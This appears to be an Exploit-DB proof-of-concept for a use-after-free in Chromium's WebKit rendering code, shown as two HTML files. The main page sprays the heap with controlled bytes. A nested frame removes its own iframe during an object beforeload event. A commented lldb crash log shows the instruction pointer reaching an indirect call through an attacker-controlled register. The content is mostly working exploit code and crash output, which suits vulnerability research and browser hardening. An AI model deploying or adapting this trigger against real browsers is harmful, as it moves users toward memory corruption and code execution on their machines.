@@ -1,0 +1,104 @@
+#---object-beforeload-chrome.html---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------#
+<html>
+	<head>
+		<script>
+			function sprayOne(mem, size, v) {
+                                var a = new Uint8ClampedArray(size - 20);
+                                for (var j = 0; j < a.length; j++) a[j] = v;
+				var t = document.createTextNode(String.fromCharCode.apply(null, new Uint16Array(a)));
+                             	mem.push(t);
+			}
+			function dsm(evnt) {
+				// spray
+				var mem = [];
+				for (var j = 20; j < 8192; j++) sprayOne(mem, j, 0x43);
+				
+/*
+
+Chromium release build 28.0.1461.0 (191833), built with options:
+
+GYP_GENERATORS=ninja GYP_DEFINES='component=shared_library mac_strip_release=0' gclient runhooks
+
+lldb attached to Chromium in --single-process mode:
+
+* thread #28: tid = 0x3803, 0x07b617e4 libwebkit.dylib`WebCore::RenderWidget::updateWidgetGeometry() [inlined] WebCore::RenderBox::contentBoxRect() const + 5 at RenderBox.h:155, stop reason = EXC_BAD_ACCESS (code=1, address=0x43434617)
+    frame #0: 0x07b617e4 libwebkit.dylib`WebCore::RenderWidget::updateWidgetGeometry() [inlined] WebCore::RenderBox::contentBoxRect() const + 5 at RenderBox.h:155
+   152 	    virtual IntRect borderBoundingBox() const { return pixelSnappedBorderBoxRect(); } 
+   153 	
+   154 	    // The content area of the box (excludes padding - and intrinsic padding for table cells, etc... - and border).
+-> 155 	    LayoutRect contentBoxRect() const { return LayoutRect(borderLeft() + paddingLeft(), borderTop() + paddingTop(), contentWidth(), contentHeight()); }
+   156 	    // The content box in absolute coords. Ignores transforms.
+   157 	    IntRect absoluteContentBox() const;
+   158 	    // The content box converted to absolute coords (taking transforms into account).
+
+(lldb) reg read
+General Purpose Registers:
+       eax = 0x43434343
+       ebx = 0x12ae436c
+       ecx = 0x00000018
+       edx = 0x0edab374
+       edi = 0x0edd6858
+       esi = 0x12ae436c
+       ebp = 0xb9bf8e38
+       esp = 0xb9bf8d50
+        ss = 0x00000023
+    eflags = 0x00010286
+       eip = 0x07b617e4  libwebkit.dylib`WebCore::RenderWidget::updateWidgetGeometry() + 20 [inlined] WebCore::RenderBox::contentBoxRect() const + 5 at RenderWidget.cpp:172
+  libwebcore_rendering.a`WebCore::RenderWidget::updateWidgetGeometry() + 15 at RenderWidget.cpp:172
+        cs = 0x0000001b
+        ds = 0x00000023
+        es = 0x00000023
+        fs = 0x00000023
+        gs = 0x0000000f
+
+(lldb) disass
+libwebkit.dylib`WebCore::RenderWidget::updateWidgetGeometry() + 20 [inlined] WebCore::RenderBox::contentBoxRect() const + 5 at RenderWidget.cpp:172
+libwebcore_rendering.a`WebCore::RenderWidget::updateWidgetGeometry() + 15 at RenderWidget.cpp:172:
+-> 0x7b617e4:  calll  *724(%eax)
+   0x7b617ea:  movl   %eax, -180(%ebp)
+   0x7b617f0:  movl   (%ebx), %eax
+   0x7b617f2:  movl   %ebx, (%esp)
+
+*/
+			}
+		</script>
+	</head>
+	<body>
+		<iframe src="object-beforeload-frame-chrome.html"></iframe>
+	</body>
+</html>
+#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------#
+
+
+
+
+
+#---object-beforeload-frame-chrome.html------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------#
+<html>
+	<head>
+		<script>
+			var nb = 0;
+			function handleBeforeLoad() {
+				if (++nb == 1) {
+					p.addEventListener('DOMSubtreeModified', parent.dsm, false);
+				} else if (nb == 2) {
+					p.removeChild(f);
+				}
+			}
+			
+			function documentLoaded() {
+				f = window.frameElement;
+				p = f.parentNode;
+				var o = document.createElement("object");
+				o.addEventListener('beforeload', handleBeforeLoad, false);
+				document.body.appendChild(o);
+			}
+
+			window.onload = documentLoaded;
+		</script>
+	</head>
+	<body></body>
+</html>
+#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------#
+
+## E-DB Note: Source ~ https://bugs.chromium.org/p/chromium/issues/detail?id=226696
